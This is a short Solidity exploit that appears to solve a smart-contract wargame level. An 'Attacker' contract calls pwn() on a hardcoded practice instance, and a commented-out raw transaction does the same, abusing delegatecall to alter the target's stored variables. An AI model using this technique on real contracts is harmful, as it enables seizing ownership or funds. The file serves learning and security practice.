//delegatecall using callers context -> delegate altering callers variables
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    address instAddr = 0x51996dFb43072dc14542f3ECF5cd25613A879aAD; //the addr of your instance

    function callpwn() external {
        (bool success, ) = instAddr.call(abi.encodeWithSignature("pwn()"));
        require(success == true, "Pwn was not successfull!");
    }
}
// Alternatively, can call pwn() from js console
//await sendTransaction({
//  from: "your addr",
///  to: "your instance addr",
//  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
//});